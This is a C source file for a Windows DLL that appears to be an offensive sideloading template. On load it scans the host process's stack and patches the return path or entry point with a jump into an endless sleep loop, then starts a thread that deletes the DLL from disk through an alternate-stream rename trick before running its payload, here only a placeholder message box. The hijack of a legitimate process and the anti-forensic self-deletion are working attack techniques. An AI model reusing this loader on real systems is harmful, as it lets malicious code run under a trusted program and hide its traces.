#define _UNICODE
#include "entry.h"

#define _AddressOfReturnAddress()   __builtin_frame_address (0)

#pragma comment(lib, "shlwapi.lib")

void deleteme() 
{
    WCHAR wcPath[MAX_PATH + 1];
    RtlSecureZeroMemory(wcPath, sizeof(wcPath));
    HMODULE hm = NULL;
    //Get Handle to our DLL based on Runner() function
    GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)Runner, &hm);

    //Get path of our DLL
    GetModuleFileNameW(hm, wcPath, sizeof(wcPath));
    //Close handle to our DLL
    CloseHandle(hm);
    //Open handle to DLL with delete flag
    HANDLE hCurrent = CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // rename the associated HANDLE's file name
    FILE_RENAME_INFO *fRename;
    LPWSTR lpwStream = L":gone";
    DWORD bslpwStream = (wcslen(lpwStream)) * sizeof(WCHAR);

    DWORD bsfRename = sizeof(FILE_RENAME_INFO) + bslpwStream;
    fRename = (FILE_RENAME_INFO *)malloc(bsfRename);
    memset(fRename, 0, bsfRename);
    fRename->FileNameLength = bslpwStream;
    memcpy(fRename->FileName, lpwStream, bslpwStream);
    //printf("bsfRename: %d; FileNameLength: %d; FileName: %ls\n", bsfRename, fRename->FileNameLength, fRename->FileName);
    SetFileInformationByHandle(hCurrent, FileRenameInfo, fRename, bsfRename);
    CloseHandle(hCurrent);

    // open another handle, trigger deletion on close
    hCurrent = CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // set FILE_DISPOSITION_INFO::DeleteFile to TRUE
    FILE_DISPOSITION_INFO fDelete;
    RtlSecureZeroMemory(&fDelete, sizeof(fDelete));
    fDelete.DeleteFile = TRUE;
    SetFileInformationByHandle(hCurrent, FileDispositionInfo, &fDelete, sizeof(fDelete));

    // trigger the deletion deposition on hCurrent
    CloseHandle(hCurrent);  
}

void Runner()
{
    MessageBoxA(NULL, "Hello from DLL!", "MessageBox", 0);
}

__declspec(dllexport) void go()
{
    Sleep(2000);
    deleteme();
    Runner();
    return;
}

void DoNothing() {
	while (TRUE)
    {
        Sleep(10 * 1000);
    }
}

void InstallHook(PVOID address, PVOID jump) {
	BYTE Jump[12] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
	
	DWORD old;
	VirtualProtect(address, sizeof(Jump), 0x40, &old);

	memcpy(address, Jump, 12);
	memcpy(((PBYTE)address + 2), &jump, 8);

	VirtualProtect(address, sizeof(Jump), old, &old);
}

BOOL HookTheStack() {

	// Get primary module info

	PBYTE baseAddress = NULL;
	DWORD baseSize = 0;

	//WCHAR fileName[MAX_PATH];
    char fileName[MAX_PATH];
	K32GetProcessImageFileNameA((HANDLE)-1, fileName, MAX_PATH);
	//std::wstring pathString = std::wstring(fileName);

	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());

	MODULEENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Module32Next(hSnapShot, &pEntry);
	while (hRes)
	{
		//if (pathString.find(pEntry.szModule) != std::wstring::npos) {
		if(strstr(fileName, pEntry.szModule))
        {
        	baseAddress = pEntry.modBaseAddr;
			baseSize = pEntry.modBaseSize;
			break;
		}
		hRes = Module32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);

	if (!baseAddress || !baseSize)
		return FALSE;

	// Hunt the stack

	PBYTE ldrLoadDll = (PBYTE)GetProcAddress(GetModuleHandle("ntdll"), "LdrLoadDll");
	PBYTE * stack = (PBYTE *)_AddressOfReturnAddress();
	BOOL foundLoadDll = FALSE;

	ULONG_PTR lowLimit, highLimit;
	GetCurrentThreadStackLimits(&lowLimit, &highLimit);

	for (; (ULONG_PTR)stack < highLimit; stack++) {
		if (*stack < (PBYTE)0x1000)
			continue;

		if (*stack > ldrLoadDll && *stack < ldrLoadDll + 0x1000) {
			// LdrLoadDll is in the stack, let's start looking for our module
			foundLoadDll = TRUE;
		}

		if (foundLoadDll && *stack > baseAddress && *stack < (baseAddress + baseSize)) {
			MEMORY_BASIC_INFORMATION mInfo = { 0 };
			VirtualQuery(*stack, &mInfo, sizeof(mInfo));

			if (!(mInfo.Protect & PAGE_EXECUTE_READ))
				continue;

			// Primary module is in the stack, let's hook there
			InstallHook(*stack, DoNothing);

			return TRUE;
		}
	}

	// No references found, let's just hook the entry point

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
	PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)(baseAddress + dosHeader->e_lfanew);
	PBYTE entryPoint = baseAddress + ntHeader->OptionalHeader.AddressOfEntryPoint;

	InstallHook(entryPoint, &DoNothing);
	
	return TRUE;
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{

	if (ul_reason_for_call != DLL_PROCESS_ATTACH)
		return TRUE;

	if (!HookTheStack())
		return TRUE;

	DWORD dwThread;
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)go, NULL, 0, &dwThread);

	return TRUE;
}
